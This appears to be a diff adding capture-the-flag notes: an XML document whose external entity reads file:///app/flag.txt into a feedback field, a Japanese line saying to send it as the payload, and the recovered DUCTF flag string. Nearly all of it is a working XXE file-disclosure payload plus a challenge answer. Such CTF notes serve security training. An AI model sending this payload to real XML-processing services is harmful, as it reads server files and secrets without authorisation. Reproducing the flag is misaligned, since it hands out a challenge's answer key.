@@ -1,0 +1,8 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY flag SYSTEM "file:///app/flag.txt"> ]>
+<root>
+    <feedback>&flag;</feedback>
+</root>
+
+上記をペイロードとして送る
+#DUCTF{emU_say$_he!!0_h0!@_ci@0}
